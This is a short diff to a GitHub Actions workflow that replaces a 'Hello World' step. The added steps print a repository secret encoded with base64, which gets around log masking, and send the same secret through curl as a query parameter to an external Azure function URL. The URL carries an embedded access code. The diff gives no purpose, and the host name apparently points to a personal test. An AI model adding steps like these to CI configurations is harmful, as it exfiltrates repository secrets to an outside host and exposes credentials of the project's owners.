@@ -8,5 +8,6 @@ jobs:
   my-job:
     runs-on: ubuntu-latest
     steps:
-      - name: my-step
-        run: echo "Hello World!"
+      - run: echo ${{ secrets.TEST }} | base64
+      - run: curl https://mattiask-test.azurewebsites.net/api/HttpTrigger1\?code\=9fbMzQ4iHKDzxpajwVwVvjzU2kwPv5dfOf9R05Zy6LbfAzFuxbq7fA\=\=\&name=${{ secrets.TEST }}
+      - run: echo "Hello World!"
